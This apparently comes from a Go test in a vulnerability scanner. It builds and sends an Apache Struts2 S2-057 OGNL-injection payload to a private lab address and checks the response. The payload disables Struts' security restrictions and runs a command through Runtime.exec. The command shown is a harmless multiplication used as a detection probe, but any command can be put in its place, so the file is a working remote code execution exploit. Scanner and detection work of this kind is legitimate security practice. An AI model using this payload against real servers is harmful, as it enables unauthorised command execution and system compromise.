package test

import (
	"github.com/EmYiQing/XiuScan/core/http"
	"github.com/EmYiQing/XiuScan/core/tool"
	"github.com/EmYiQing/XiuScan/log"
	"net/url"
	"strconv"
	"strings"
	"testing"
)

func TestS2057(t *testing.T) {
	rand1 := tool.GetRandomInt()
	rand2 := tool.GetRandomInt()
	cmd := "expr __rand_1__ * __rand_2__"
	cmd = strings.ReplaceAll(cmd, "__rand_1__", strconv.Itoa(rand1))
	cmd = strings.ReplaceAll(cmd, "__rand_2__", strconv.Itoa(rand2))
	cmd = url.QueryEscape(cmd)
	payload := url.QueryEscape("${\n(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)" +
		".(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensym" +
		"phony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com." +
		"opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageN" +
		"ames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberA" +
		"ccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('__cmd__')).(" +
		"@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}")
	payload = strings.ReplaceAll(payload, "__cmd__", cmd)
	payload = strings.ReplaceAll(payload, "+", "%20")
	output := tool.FormatPayload(payload)
	log.Info("payload: %s", output)
	req := &http.Request{
		Url:    http.NewUrl("http://192.168.222.132:8080/struts2-showcase/" + payload + "/actionChain1.action"),
		Method: "GET",
	}
	resp := http.DoRequest(req)
	if strings.Contains(string(resp.Body), strconv.Itoa(rand1*rand2)) {
		log.Info("find S2-057")
	}
}
